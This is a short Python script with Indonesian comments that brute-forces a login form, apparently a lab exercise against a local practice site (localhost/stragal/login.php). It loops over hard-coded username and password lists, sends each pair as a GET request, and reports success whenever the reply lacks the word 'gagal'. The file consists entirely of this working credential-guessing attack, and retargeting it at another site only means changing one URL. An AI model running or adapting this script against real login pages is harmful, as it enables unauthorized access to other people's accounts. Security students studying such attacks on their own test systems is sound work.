import time
import requests
url = 'http://localhost/stragal/login.php'   #untuk koneksi mengambil request nantinya, url disesuaikan dengan local server masing-masing

#list kata kunci untuk dicari username dan passwordnya
users = ['user', 'admin', 'password', 'bandung', 'katasandi', 'telkom', 'sukapura1', 'sukabirus3', 'sInerGiBanguNNegri', 'kitaBisa', 'user1', 'admin1', 'user3', 'admin2', 'akukeren1*']
passwords = ['user', 'admin', 'password', 'bandung', 'katasandi', 'telkom', 'sukapura1', 'sukabirus3', 'sInerGiBanguNNegri', 'kitaBisa', 'user1', 'admin1', 'user3', 'admin2', 'akukeren1*']

for user in users:
    for password in passwords:
        print (f"trying username={user} and password={password}")
        payload = f'?username={user}&password={password}&Submit=Login#'  #membentuk template
        req = requests.get(url + payload)  #mengambil hasil dari request ke websitenya
        if not 'gagal' in req.text:   #jika tidak ada kata "gagal" dalam hasil percobaan bruteforcenya maka username dan password ditemukan
            print()
            print (f"ketemu! username: {user} password: {password}")
            print()
             
        
             
